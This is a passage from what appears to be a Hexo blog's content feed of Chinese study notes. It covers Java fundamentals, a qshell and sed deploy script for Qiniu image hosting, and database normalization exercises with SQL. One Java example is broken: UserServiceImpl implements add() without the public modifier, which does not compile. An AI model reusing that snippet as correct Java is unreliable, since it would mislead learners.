class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># output</span></span><br><span class="line">静态代码块</span><br><span class="line">Person无参构造</span><br><span class="line">匿名代码块</span><br><span class="line">Student无参构造</span><br><span class="line">==================</span><br><span class="line">Person无参构造</span><br><span class="line">匿名代码块</span><br><span class="line">Student无参构造</span><br></pre></td></tr></table></figure><p>可见，执行顺序是静态代码块、父类构造方法、匿名代码块，子类构造方法。且静态代码块只最初执行一次。</p><h3 id="静态导入包"><a href="#静态导入包" class="headerlink" title="静态导入包"></a>静态导入包</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.lang.Math.random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(random());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如此，使用random方法时，就不用写<code>Math.random()</code>，而是可以直接写<code>random()</code>。</p><p>被final修饰的类不能再有子类。</p><h2 id="abstract抽象类"><a href="#abstract抽象类" class="headerlink" title="abstract抽象类"></a>abstract抽象类</h2><p>抽象方法：只有方法名字，没有方法的实现。</p><p>抽象类的所有方法，继承了它的子类，都必须要实现它的方法，除非子类也是抽象类。</p><p>特点：不能new这个抽象类，只能靠子类去实现，它是一种约束！一旦类里面有抽象方法，则类必须是抽象类。抽象类里面可以写普通方法。</p><p>存在的意义：抽象出来，提高开发效率，提高可扩展性。</p><h2 id="interface接口"><a href="#interface接口" class="headerlink" title="interface接口"></a>interface接口</h2><p>普通类只有具体实现，抽象类有具体实现和规范（抽象方法），接口则只有规范，自己无法写方法。</p><p><strong>接口的本质是契约。</strong>接口中的所有定义其实都是抽象的<code>public abstract</code>。所有变量其实都是<code>public static final</code>。</p><p>类可以实现接口，关键字<code>implements</code>。类实现了接口，就<strong>必须</strong>重写接口中的方法。</p><p>作用：约束；定义一些方法让不同的人实现。</p><p>接口不能被实例化，接口中没有构造方法。</p><p><code>extends</code>只有单继承，但是可以<code>implements</code>可以多继承。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UserService.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(String name)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(String name)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">query</span><span class="params">(String name)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TimeService.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">TimeService</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">timer</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UserServiceImpl.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserService</span>, TimeService &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete</span><span class="params">(String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">query</span><span class="params">(String name)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">timer</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h2><ol><li>成员内部类</li><li>静态内部类</li><li>局部内部类</li><li>匿名内部类</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> <span class="number">11</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">out</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Outer&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 成员内部类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inner1</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">in</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Inner&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">GetID</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 方法内部类（局部内部类）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Inner2</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 一个java文件中可以有多个class，但是只能有一个public class。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 测试成员内部类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Outer</span> <span class="variable">outer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">        Outer.<span class="type">Inner1</span> <span class="variable">inner</span> <span class="operator">=</span> outer.<span class="keyword">new</span> <span class="title class_">Inner1</span>();</span><br><span class="line">        inner.in();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h1><p>软件程序在运行过程中，经常遇到各种异常或意外。这些Exception，让我们写的程序做出合理的处理，而不至于程序崩溃。</p><ul><li>检查性异常：最具代表性的检查性异常是用户错误或问题引起的异常，这是程序员无法预见的。例如要打开一个不存在的文件时。这些异常在编译时不能被简单忽略。</li><li>运行时异常：可能被程序员避免的异常。这些异常在编译时可以被忽略。</li><li>错误ERROR：错误不是异常，而是脱离程序员控制的问题。例如栈溢出。</li></ul><p>Java把异常当作对象来处理，定义基类java.lang.Throwable作为所有异常的超类。分为两大类：<strong>错误Error</strong>和<strong>异常Exception</strong>。出现前者时，JVM一般终止线程；后者则是通常情况下可以被程序处理，并且在程序中应该尽可能的去处理。</p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>五个关键字<code>try</code>、<code>catch</code>、<code>finally</code>、<code>throw</code>、<code>throws</code>。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// example</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;<span class="comment">//监控区域</span></span><br><span class="line">        System.out.println(a / b);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ArithmeticException e) &#123;<span class="comment">//捕获异常</span></span><br><span class="line">        System.out.println(<span class="string">&quot;捕获&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;<span class="comment">//处理善后工作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;finally.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>catch</code>里面的参数是想要捕获的异常类型，<code>catch</code>可以写多个，层层递进，范围最大的在最后。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Demo01</span>().test(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ArithmeticException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 假设这个方法中处理不了这个异常，方法上抛出异常。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> <span class="keyword">throws</span> ArithmeticException &#123;</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArithmeticException</span>(); <span class="comment">//主动抛出异常，一般在方法中使用</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h2><p>用户自定义异常类，只需继承Exception类即可。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyException</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> detail;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyException</span><span class="params">(<span class="type">int</span> a)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.detail = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 异常的打印信息</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyException&#123;&quot;</span> + detail + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test(<span class="number">11</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MyException e) &#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> a)</span> <span class="keyword">throws</span> MyException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;传递的参数为&quot;</span> + a);</span><br><span class="line">        <span class="keyword">if</span> (a &gt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MyException</span>(a);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># output</span></span><br><span class="line"><span class="comment"># when test(11)</span></span><br><span class="line">传递的参数为11</span><br><span class="line">MyException&#123;11&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># when test(9)</span></span><br><span class="line">传递的参数为9</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p><strong>经验总结：</strong></p><ul><li>采用逻辑去合理规避同时辅助try-catch处理。</li><li>多重catch后面，加一个catch(Exception)来处理可能被遗漏的异常。</li><li>不确定的代码，也可以加上try-catch来处理潜在异常。</li><li>尽量去处理异常，切忌只是简单的printStackTrace去打印输出。</li><li>具体如何处理，根据业务需求去决定。</li><li>尽量添加finally语句块去释放占用的资源。</li></ul><h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><p>IDEA快捷操作</p><ul><li>输入一个数字，再输入<code>.</code>，即可快捷生成for循环语句。输入<code>fori</code>也可以。</li><li>Ctrl+D可以将当前行复制到下一行。</li><li>类中，Alt+Insert快捷生成构造器，以及Getter和Setter，以及重写方法。或者鼠标右键，选择Generate。</li><li>选中多行代码后，Ctrl+&#x2F;为快捷注释，Tab为整体缩进右移，Tab+Shift为整体缩进左移。</li><li>光标移动到某个类，Ctrl+H快捷键查看其继承关系。或点击侧边栏Hierarchy。</li><li>选中某部分代码，Ctrl+Alt+T可以使选中代码surround with，生成while、if、try等。好像和QQ冲突了，可以改快捷键。</li></ul><p>递归小心爆栈。</p><p><a href="https://developer.aliyun.com/topic/java2020?utm_content=g_1000113416">《阿里巴巴Java开发手册》</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三行代码搞定七牛云文件上传和博客部署</title>
      <link href="/2020/06/21/qiniu/"/>
      <url>/2020/06/21/qiniu/</url>
      
        <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>hexo博客</li><li>已备案的域名</li><li>命令行工具<a href="https://github.com/qiniu/qshell">qshell</a></li><li>关于图床的配置，引用一下hxd的文章——<a href="https://www.bolun.xyz/2020/06/19/Markdown_Picgo/">几种将本地Markdown中图片自动上传到图床的方法</a></li></ul><h2 id="七牛云配置"><a href="#七牛云配置" class="headerlink" title="七牛云配置"></a>七牛云配置</h2><p>首先你要有一个七牛云账户，然后之后的实名认证什么的就不说了。</p><p>然后在对象储存里新建一个bucket就可以进行基础的文件储存了，但是七牛云的外网访问流量是收费的，而其CDN回源流量有一定免费量，所以接下来配置CDN。</p><p><img src="https://img.lfalive.top/qiniu/1.png"></p><p>在bucket的<code>空间管理</code>处设置CDN加速域名。</p><p><img src="https://img.lfalive.top/qiniu/2.png"></p><p>进行如下界面后，添加域名（建议添加自己域名下的二级域名），然后源站配置处选择这个存图的bucket（应该已经默认选中了）。</p><p><img src="https://img.lfalive.top/qiniu/3.png"></p><p>很快就配置好了，接下来只需要去域名服务商配置域名的 CNAME就可以了，不赘述。稍等片刻就可以使用自定义的域名访问bucket中的文件了。</p><h2 id="自动上传图片文件"><a href="#自动上传图片文件" class="headerlink" title="自动上传图片文件"></a>自动上传图片文件</h2><p>手动打开网页并上传文件，设置前缀，还是很麻烦的。这里就用脚本来做了。在hexo博客的根目录下，额外放几个文件。</p><img src="https://img.lfalive.top/qiniu/4.png" style="zoom: 80%;" /><p>依次解释。qshell.exe是文章开头所提到的工具之一，qshell是利用<a href="https://developer.qiniu.com/">七牛文档上公开的API</a>实现的一个方便开发者测试和使用七牛API服务的命令行工具。最初使用的时候，记得在命令行中调用一次，完成如下操作。</p><img src="https://img.lfalive.top/qiniu/6.png" style="zoom:70%;" /><p>blogimg是自己本地备份博客所用图片文件的文件夹，里面有博客的头图、头像图和每篇文章的配图。其中文章的配图在以各自markdown文件名命名的文件夹里。举个栗子，我的&#x2F;source&#x2F;_posts文件夹里有文件<code>qiniu.md</code>，即这篇文章，则blogimg文件夹里就建立一个名为<code> qiniu</code>的文件夹来放这篇文章所用到的配图。然后在文章中插入本地图片时直接调用一个很简短的相对路径，如下。</p><p><img src="https://img.lfalive.top/qiniu/5.png"></p><p>看起来已经迈出了一大步，但是仅此是不够的，最终要实现的是把配图上传到七牛云并通过CDN加速。这时候就要用到脚本<code>deploy.sh</code>了，脚本代码如下。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./qshell.exe qupload2 --thread-count=5 --src-dir=./blogimg/<span class="variable">$1</span> --key-prefix=<span class="variable">$1</span>/ --bucket=lfalive-b1 --check-exists=<span class="literal">true</span> --check-hash=<span class="literal">true</span> --overwrite=<span class="literal">true</span> --rescan-local=<span class="literal">true</span></span><br><span class="line">sed -i <span class="string">&quot;s/..\/..\/blogimg/https:\/\/img.lfalive.top/g&quot;</span> ./source/_posts/<span class="variable">$1</span>.md</span><br></pre></td></tr></table></figure><p>第一行命令是调用qshell文件，执行上传文件功能，所用到参数介绍可以参考<a href="https://github.com/qiniu/qshell/blob/master/docs/qupload.md">官方文档</a>。这里配置几个关键参数。</p><ul><li><code>thread-count</code>是并发上传的协程数量。</li><li><code>src-dir</code>是本地的文件源目录，这里自然就是blogimg文件夹了。</li><li><code>key-prefix</code>是文件前缀，在这儿我们自然也要加上相应的前缀，即子文件夹名。</li><li><code>bucket</code>是你的七牛云bucket名称。</li><li><code>check-exists</code>就是检查即将上传的文件在七牛云bucket中是否已经存在。</li><li><code>check-hash</code>指检查是否重名后，还要校验hash。</li><li><code>overwrite</code>指是否覆盖空间中已有的同名文件。</li><li><code>rescan-local</code>表示扫描本地新增的文件并进行同步。</li></ul><p><img src="https://img.lfalive.top/qiniu/7.png"></p><p>上图是三次测试上传的log。可以看到，第一次直接上传成功，第二次加了check-exists和check-hash参数，找到了一个hash不匹配的重名文件，但是由于没有允许覆盖，所以云空间里的文件没有变，第三次则是配置了允许覆盖，提示成功覆盖上传了一个重名的文件。这样配置可以保证云空间的文件始终和本地相同。</p><p>关于qshell的更多用法和qupload的更多参数配置，可以去看官方文档了解。</p><p>命令第二行则是用sed函数，把markdown文件里的本地相对路径调用全部改为调用云空间的图片。<a href="https://blog.csdn.net/qq_35180983/article/details/82936506">参考的资料</a>有很多，注意写的时候斜杠用一下转义符就好。</p><p>命令中，<code>$1</code>是指调用时传入的第一个参数。所以，调用时直接在hexo博客根目录呼出命令行，执行<code>sh deploy.sh qiniu</code>即可，这里输入的参数<code>qiniu</code>就是<code>$1</code>，是你的markdown文件名，是你本地blogimg文件夹里子文件夹的名称，是调用图片时的文件前缀，实现了统一。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>如果你的文件名有一些特殊符号例如<code>&amp; </code>，记得给参数加个引号调用，如<code>sh deploy.sh &#39;qi&amp;niu&#39;</code>，不然会出错。</p><img src="https://img.lfalive.top/qiniu/8.png" style="zoom:80%;" /><p>另一方面，带特殊符号的文件上传到七牛云后就是这个样子，文件名中依然是<code>&amp;</code>符号，但是文件链接中变成了<code>%26</code>。但是经过实测，在网络中引用该图片时，两种方式都可以调用成功，并不影响。</p><h2 id="进一步完善"><a href="#进一步完善" class="headerlink" title="进一步完善"></a>进一步完善</h2><p>博客的部署也只需要三个指令，一行代码就可以搞定。把这些指令也加在脚本里吧！</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><p>最终我的<code>deploy.sh</code>是这样的。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    ./qshell.exe qupload2 --thread-count=5 --src-dir=./blogimg/<span class="variable">$1</span> --key-prefix=<span class="variable">$1</span>/ --bucket=lfalive-b1 --check-exists=<span class="literal">true</span> --check-hash=<span class="literal">true</span> --overwrite=<span class="literal">true</span> --rescan-local=<span class="literal">true</span></span><br><span class="line">    sed -i <span class="string">&quot;s/..\/..\/blogimg/https:\/\/img.lfalive.top/g&quot;</span> ./source/_posts/<span class="variable">$1</span>.md</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><p>如果有传入参数，就执行图片上传和引用替换。不管有没有传入参数，都执行博客的部署。这样就把两步合成了一步。</p><p>另有一个<code>local.sh</code>是用本地服务器运行博客预览效果的，其实只有最后一个字符不同而已。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure><p>mac，linux或是windows，思路都是如此，配置大同小异。都直接用命令行调用脚本就可以了，十分方便。如果是windows平台windows平台的话肯定也装了git，根目录右键git bash+上方向键+回车，一套操作就完成了，当然你直接双击运行都行。</p><h2 id="再迈一小步"><a href="#再迈一小步" class="headerlink" title="再迈一小步"></a>再迈一小步</h2><p>我的习惯本来就是会把用到的图片在本地归档备份然后调用，所以做到这步已经足够。对于懒得归档的同学，提供一个思路，在Typora中设置。</p><img src="https://img.lfalive.top/qiniu/9.png" style="zoom:80%;" /><p>写文章时，自动把用到的图片复制到指定的路径中，即blogimg文件夹里的同名子文件夹里。写完后直接调用脚本，一条龙服务完事儿。</p><p>这个“优先使用相对路径”的选项是个好东西，建议勾选。</p><img src="https://img.lfalive.top/qiniu/10.png" style="zoom:80%;" /><p>即使不用Typora的自动复制功能，在通过如上图方式（打开的对话框选择图片文件）调用本地图片时，也可以直接得到前文所提到的相对路径，而不是一个绝对路径，自己还得手动改为相对路径，不然执行脚本时改引用不会被正确替换。</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
            <tag> hexo </tag>
            
            <tag> 七牛云 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《数据库系统概论》课程设计</title>
      <link href="/2020/06/18/db-hw-project/"/>
      <url>/2020/06/18/db-hw-project/</url>
      
        <content type="html"><![CDATA[<p>pymysql套个马甲，一个简陋的仓库管理系统。</p><p><a href="https://github.com/lfalive/MySQL-Warehouse-Management">项目链接</a></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> databases </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《数据库系统概论》例程及习题（四）</title>
      <link href="/2020/06/17/db-hw9&amp;10/"/>
      <url>/2020/06/17/db-hw9&amp;10/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>今天水完了DB的最后一节课，把之前的做的合在一起发一下。后面几次作业都没有实验，全是无脑copy参考书，没有什么记录的意义，所以迟迟懒得放上来。</p><h2 id="习题6-2"><a href="#习题6-2" class="headerlink" title="习题6.2"></a>习题6.2</h2><p><strong>关系模式</strong>：</p><p>学生S(SNO,SN,SB,DN,CNO,SA)</p><p>SNO学号，SN姓名，SB出生年月，SA宿舍区；</p><p>班级C(CNO,CS,DN,CNUM,CDATE)</p><p>CNO班号，CS专业名，CNUM班级人数，CDATE入校年份；</p><p>系D(DNO,DN,DA,DNUM)</p><p>DON系号，DN系名，DA系办公室地点，DNUM系人数；</p><p>学会P(PN,DATE1,PA,PNUM)</p><p>PN学会名，DATE1成立年月，PA地点，PNUM学会会员人数；</p><p>学生-学会SP(SNO,PN,DATE2)</p><p>DATE2入会年份。</p><p><strong>极小函数依赖集</strong></p><p>S:SNO→SN,SNO→SB,SNO→CNO,SNO→DN,DN→SA</p><p>C:CNO→CS,CNO→CNUM,CNO→CDATE,CS→DN,(CS,CDATE)→CNO</p><p>D:DNO→DN,DN→DNO,DNO→DA,DNO→DNUM</p><p>P:PN→DATE1,PN→PA,PN→PNUM</p><p>SP:(SNO,PN)→DATE2</p><p><strong>S中存在的传递函数依赖：</strong></p><p>因为SNO→CNO→DN,所以SNO→DN;</p><p>因为CNO→DN→SA,所以CNO→SA;</p><p>因为SNO→CNO→DN→SA,所以SNO→SA。</p><p><strong>C中存在的传递函数依赖：</strong></p><p>因为CNO→CS→DN,所以CNO→DN。</p><p><strong>函数依赖左部是多属性的情况：</strong></p><p>都是完全函数依赖，没有部分函数依赖的情况。</p><table><thead><tr><th align="center">关系</th><th align="center">候选码</th><th align="center">外部码</th><th align="center">全码</th></tr></thead><tbody><tr><td align="center">S</td><td align="center">SNO</td><td align="center">CNO,DN</td><td align="center">无</td></tr><tr><td align="center">C</td><td align="center">CNO和(CS,CDATE)</td><td align="center">DN</td><td align="center">无</td></tr><tr><td align="center">D</td><td align="center">DNO和DN</td><td align="center">无</td><td align="center">无</td></tr><tr><td align="center">P</td><td align="center">PN</td><td align="center">无</td><td align="center">无</td></tr><tr><td align="center">SP</td><td align="center">(SNO,PN)</td><td align="center">SNO,PN</td><td align="center">无</td></tr></tbody></table><h2 id="习题6-6"><a href="#习题6-6" class="headerlink" title="习题6.6"></a>习题6.6</h2><p>（一）属性BC包含码。</p><p>（二）ACE,DEC,BCE。</p><p>（三）因为A、B、C、D、E都是主属性，所以R是3NF。</p><h2 id="习题6-8"><a href="#习题6-8" class="headerlink" title="习题6.8"></a>习题6.8</h2><p>（一）①如果R是BCNF，则R是3NF。</p><p>反证法。设关系R是BCNF但不是3NF。则关系R中存在候选码X，属性组Y和非主属性Z（Z不包含于Y）满足X→Y，Y→Z，不满足Y→X。因此Y不包含候选码，即Y→Z函数依赖的决定因素Y不包含候选码与R是BCNF相矛盾。</p><p>②R是3NF，但R不一定是BCNF。</p><p>若对于学生、教师、课程的关系模式，每一位教师只教一门课。每门课有若干教师，某一学生选定某门课，就对应一个固定的教室，可以得到（学生，课程）→老师；（学生，老师）→课程；老师→课程。这里是3NF，因为没有任何非主属性对码传递依赖或部分依赖。但不是BCNF关系，因为老师是决定因素而老师不包含码。</p><p>（二）如果R是3NF关系模式，则R一定是2NF关系模式。</p><p>反证法。设关系R是3NF但不是2NF。则必然存在一个非主属性Z，不完全函数依赖于码。因此存在候选码X的真子集Y，Y→Z。而由于Y是X的真子集，因此不存在Y→X，用时由于Y是主属性，Z不是主属性，因此Z不包含于Y，即与R属于3NF相矛盾。</p><h2 id="习题8-2"><a href="#习题8-2" class="headerlink" title="习题8.2"></a>习题8.2</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建数据表和插入数据</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Student</span><br><span class="line">(Sno <span class="type">CHAR</span>(<span class="number">9</span>) <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> Sname <span class="type">CHAR</span>(<span class="number">20</span>) <span class="keyword">UNIQUE</span>,</span><br><span class="line"> Ssex <span class="type">CHAR</span>(<span class="number">2</span>),</span><br><span class="line"> Sage <span class="type">SMALLINT</span>,</span><br><span class="line"> Sdept <span class="type">CHAR</span>(<span class="number">20</span>)</span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Course</span><br><span class="line">(Cno    <span class="type">CHAR</span>(<span class="number">4</span>) <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line"> Cname   <span class="type">CHAR</span>(<span class="number">40</span>),</span><br><span class="line"> Cpno    <span class="type">CHAR</span>(<span class="number">4</span>),</span><br><span class="line"> Ccredit <span class="type">SMALLINT</span>,</span><br><span class="line"> <span class="keyword">FOREIGN</span> KEY (Cpno) <span class="keyword">REFERENCES</span> Course(Cno)</span><br><span class="line"> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> SC</span><br><span class="line">(Sno <span class="type">CHAR</span>(<span class="number">9</span>),</span><br><span class="line"> Cno <span class="type">CHAR</span>(<span class="number">4</span>),</span><br><span class="line"> Grade <span class="type">SMALLINT</span>,</span><br><span class="line"> Level <span class="type">CHAR</span>(<span 